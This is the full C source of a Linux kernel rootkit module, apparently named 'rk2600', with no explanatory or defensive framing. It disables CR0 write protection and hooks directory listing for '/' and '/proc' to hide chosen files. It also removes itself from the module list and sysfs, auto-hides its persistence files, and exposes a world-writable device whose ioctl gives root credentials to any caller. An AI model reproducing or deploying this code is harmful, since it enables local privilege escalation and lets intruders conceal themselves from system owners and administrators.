#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/proc_fs.h>
#include <linux/kobject.h>
#include <asm/processor-flags.h>

#include "rk2600_protocol.h"

/* ---------------------------------------------------------------- hidden list */

struct hidden_entry {
	struct list_head list;
	char name[RK2600_NAME_MAX + 1];
};

static LIST_HEAD(hidden_names);
static DEFINE_SPINLOCK(hidden_lock);

static bool name_is_hidden(const char *name, int namlen)
{
	struct hidden_entry *e;
	bool found = false;

	spin_lock(&hidden_lock);
	list_for_each_entry(e, &hidden_names, list) {
		if ((int)strlen(e->name) == namlen &&
		    memcmp(e->name, name, namlen) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_lock);
	return found;
}

static int hide_name(const char *name)
{
	struct hidden_entry *e;
	struct hidden_entry *new_entry;

	new_entry = kzalloc(sizeof(*new_entry), GFP_KERNEL);
	if (!new_entry)
		return -ENOMEM;
	strscpy(new_entry->name, name, sizeof(new_entry->name));

	spin_lock(&hidden_lock);
	list_for_each_entry(e, &hidden_names, list) {
		if (strcmp(e->name, name) == 0) {
			spin_unlock(&hidden_lock);
			kfree(new_entry);
			return 0;
		}
	}
	list_add_tail(&new_entry->list, &hidden_names);
	spin_unlock(&hidden_lock);
	return 0;
}

static int show_name(const char *name)
{
	struct hidden_entry *e, *tmp;

	spin_lock(&hidden_lock);
	list_for_each_entry_safe(e, tmp, &hidden_names, list) {
		if (strcmp(e->name, name) == 0) {
			list_del(&e->list);
			spin_unlock(&hidden_lock);
			kfree(e);
			return 0;
		}
	}
	spin_unlock(&hidden_lock);
	return -ENOENT;
}

static void flush_hidden(void)
{
	struct hidden_entry *e, *tmp;
	LIST_HEAD(freelist);

	spin_lock(&hidden_lock);
	list_splice_init(&hidden_names, &freelist);
	spin_unlock(&hidden_lock);

	list_for_each_entry_safe(e, tmp, &freelist, list) {
		list_del(&e->list);
		kfree(e);
	}
}

/* -------------------------------------------------------- write-protect bypass */

static inline unsigned long wp_disable(void)
{
	unsigned long cr0;

	preempt_disable();
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	asm volatile("mov %0, %%cr0" : : "r"(cr0 & ~X86_CR0_WP) : "memory");
	return cr0;
}

static inline void wp_restore(unsigned long cr0)
{
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	preempt_enable();
}

/* ----------------------------------------------------------- dir hook context */

struct rk_dir_ctx {
	struct dir_context ctx;
	struct dir_context *real;
};

/* ------------------------------------------------------------- root FS hook */

static int (*orig_root_iterate)(struct file *, struct dir_context *);
static struct file_operations *root_fops;

static bool root_filldir(struct dir_context *ctx, const char *name,
			 int namlen, loff_t offset, u64 ino,
			 unsigned int d_type)
{
	struct rk_dir_ctx *rk = container_of(ctx, struct rk_dir_ctx, ctx);

	if (name_is_hidden(name, namlen))
		return true;

	return rk->real->actor(rk->real, name, namlen, offset, ino, d_type);
}

static int rk_root_iterate(struct file *file, struct dir_context *ctx)
{
	struct rk_dir_ctx rk = {
		.ctx.actor = root_filldir,
		.ctx.pos   = ctx->pos,
		.real      = ctx,
	};
	int ret;

	ret = orig_root_iterate(file, &rk.ctx);
	ctx->pos = rk.ctx.pos;
	return ret;
}

static int install_root_hook(void)
{
	struct file *f;
	unsigned long cr0;

	f = filp_open("/", O_RDONLY | O_DIRECTORY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	root_fops = (struct file_operations *)f->f_op;
	orig_root_iterate = root_fops->iterate_shared;

	cr0 = wp_disable();
	root_fops->iterate_shared = rk_root_iterate;
	wp_restore(cr0);

	filp_close(f, NULL);
	return 0;
}

static void remove_root_hook(void)
{
	unsigned long cr0;

	if (!root_fops || !orig_root_iterate)
		return;
	cr0 = wp_disable();
	root_fops->iterate_shared = orig_root_iterate;
	wp_restore(cr0);
}

/* -------------------------------------------------------------- proc FS hook */

static int (*orig_proc_iterate)(struct file *, struct dir_context *);
static struct file_operations *proc_fops_ptr;

static bool proc_filldir(struct dir_context *ctx, const char *name,
			 int namlen, loff_t offset, u64 ino,
			 unsigned int d_type)
{
	struct rk_dir_ctx *rk = container_of(ctx, struct rk_dir_ctx, ctx);

	if (namlen == (int)(sizeof(RK2600_PROC_NAME) - 1) &&
	    memcmp(name, RK2600_PROC_NAME, namlen) == 0)
		return true;

	return rk->real->actor(rk->real, name, namlen, offset, ino, d_type);
}

static int rk_proc_iterate(struct file *file, struct dir_context *ctx)
{
	struct rk_dir_ctx rk = {
		.ctx.actor = proc_filldir,
		.ctx.pos   = ctx->pos,
		.real      = ctx,
	};
	int ret;

	ret = orig_proc_iterate(file, &rk.ctx);
	ctx->pos = rk.ctx.pos;
	return ret;
}

static int install_proc_hook(void)
{
	struct file *f;
	unsigned long cr0;

	f = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	proc_fops_ptr = (struct file_operations *)f->f_op;
	orig_proc_iterate = proc_fops_ptr->iterate_shared;

	cr0 = wp_disable();
	proc_fops_ptr->iterate_shared = rk_proc_iterate;
	wp_restore(cr0);

	filp_close(f, NULL);
	return 0;
}

static void remove_proc_hook(void)
{
	unsigned long cr0;

	if (!proc_fops_ptr || !orig_proc_iterate)
		return;
	cr0 = wp_disable();
	proc_fops_ptr->iterate_shared = orig_proc_iterate;
	wp_restore(cr0);
}

/* ----------------------------------------------------------- module hiding */

static struct list_head *saved_prev;
static bool mod_hidden;

static void do_hide_module(void)
{
	if (mod_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	mod_hidden = true;
}

static void do_show_module(void)
{
	if (!mod_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	mod_hidden = false;
}

/* -------------------------------------------------------- privilege escalation */

static int do_elevate(void)
{
	struct cred *new;

	new = prepare_kernel_cred(NULL);
	if (!new)
		return -ENOMEM;
	return commit_creds(new);
}

/* ------------------------------------------------------------- ioctl handler */

static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct rk2600_name_request req;
	struct rk2600_status st;

	switch (cmd) {
	case RK2600_IOC_ELEVATE:
		return do_elevate();

	case RK2600_IOC_STATUS:
		st.api_version = RK2600_API_VERSION;
		st.flags = mod_hidden ? RK2600_FLAG_HIDDEN : 0;
		if (copy_to_user((void __user *)arg, &st, sizeof(st)))
			return -EFAULT;
		return 0;

	case RK2600_IOC_HIDE:
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		req.name[RK2600_NAME_MAX] = '\0';
		if (req.name[0] == '\0')
			return -EINVAL;
		return hide_name(req.name);

	case RK2600_IOC_UNHIDE:
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		req.name[RK2600_NAME_MAX] = '\0';
		if (req.name[0] == '\0')
			return -EINVAL;
		return show_name(req.name);

	case RK2600_IOC_MODHIDE:
		do_hide_module();
		return 0;

	case RK2600_IOC_MODSHOW:
		do_show_module();
		return 0;

	default:
		return -ENOTTY;
	}
}

/* ---------------------------------------------------------- /proc/.rk writer */

static struct proc_dir_entry *proc_entry;

static ssize_t proc_rk_write(struct file *file, const char __user *ubuf,
			      size_t count, loff_t *ppos)
{
	char buf[RK2600_NAME_MAX + 2];
	size_t len;
	int ret;

	if (count == 0 || count > sizeof(buf) - 1)
		return -EINVAL;
	if (copy_from_user(buf, ubuf, count))
		return -EFAULT;

	buf[count] = '\0';
	len = count;
	if (len > 0 && buf[len - 1] == '\n')
		buf[--len] = '\0';
	if (len == 0)
		return -EINVAL;

	if (strcmp(buf, "flush") == 0) {
		flush_hidden();
		return (ssize_t)count;
	}
	if (strcmp(buf, "hide") == 0) {
		do_hide_module();
		return (ssize_t)count;
	}
	if (strcmp(buf, "unhide") == 0) {
		do_show_module();
		return (ssize_t)count;
	}
	if (buf[0] == '+' && len > 1) {
		ret = hide_name(buf + 1);
		return ret < 0 ? ret : (ssize_t)count;
	}
	if (buf[0] == '-' && len > 1) {
		ret = show_name(buf + 1);
		return ret < 0 ? ret : (ssize_t)count;
	}

	return -EINVAL;
}

static const struct proc_ops proc_rk_ops = {
	.proc_write = proc_rk_write,
};

/* --------------------------------------------------------------- misc device */

static const struct file_operations rk_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = rk_ioctl,
};

static struct miscdevice rk_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = RK2600_DEVICE_NAME,
	.fops  = &rk_fops,
	.mode  = 0666,
};

/* ---------------------------------------------------------- module init/exit */

static int __init rk_init(void)
{
	int ret;

	ret = misc_register(&rk_dev);
	if (ret)
		return ret;

	ret = install_root_hook();
	if (ret)
		goto err_dev;

	proc_entry = proc_create(RK2600_PROC_NAME, 0200, NULL, &proc_rk_ops);
	if (!proc_entry) {
		ret = -ENOMEM;
		goto err_root;
	}

	ret = install_proc_hook();
	if (ret)
		goto err_proc;

	/* Auto-hide persistence artefacts on the root filesystem */
	hide_name(RK2600_PERSIST_NAME);
	hide_name(RK2600_MODULE_FILE);
	hide_name(RK2600_MODULE_NAME);

	do_hide_module();

	return 0;

err_proc:
	proc_remove(proc_entry);
err_root:
	remove_root_hook();
err_dev:
	misc_deregister(&rk_dev);
	return ret;
}

static void __exit rk_exit(void)
{
	remove_proc_hook();
	proc_remove(proc_entry);
	remove_root_hook();
	flush_hidden();
	misc_deregister(&rk_dev);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rk2600");
